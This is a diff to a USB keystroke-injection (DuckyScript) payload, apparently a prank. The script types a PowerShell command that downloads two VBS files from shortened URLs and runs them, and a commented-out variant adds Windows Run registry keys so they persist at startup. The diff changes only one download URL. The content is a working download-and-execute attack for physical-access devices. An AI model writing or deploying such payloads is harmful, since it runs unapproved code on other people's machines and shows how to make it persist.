@@ -8,7 +8,7 @@ ENTER
 DELAY 500
 ALT y
 DELAY 200
-STRING powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/mdqw6T','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && exit
-REM powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/mdqw6T','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup.vbs && exit
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/2ahFyH','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && exit
+REM powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/2ahFyH','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup.vbs && exit
 DELAY 200
 ENTER
